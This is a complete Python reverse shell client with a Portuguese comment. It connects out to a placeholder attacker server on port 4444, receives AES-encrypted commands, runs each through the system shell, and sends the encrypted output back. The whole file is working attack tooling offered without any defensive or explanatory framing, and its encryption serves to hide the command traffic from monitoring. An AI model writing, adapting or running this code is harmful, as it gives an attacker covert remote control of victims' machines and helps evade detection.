
import socket
import subprocess
from Crypto.Cipher import AES

KEY = b'ThisIsA16ByteKey'  # Deve ter 16, 24 ou 32 bytes

def decrypt(enc_data, key):
    nonce = enc_data[:16]
    tag = enc_data[16:32]
    ciphertext = enc_data[32:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

def encrypt(data, key):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return cipher.nonce + tag + ciphertext

def connect(server_ip, server_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))
    while True:
        enc_command = sock.recv(4096)
        command = decrypt(enc_command, KEY).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        enc_output = encrypt(output.stdout + output.stderr, KEY)
        sock.send(enc_output)
    sock.close()

if __name__ == "__main__":
    connect("YOUR_SERVER_IP", 4444)
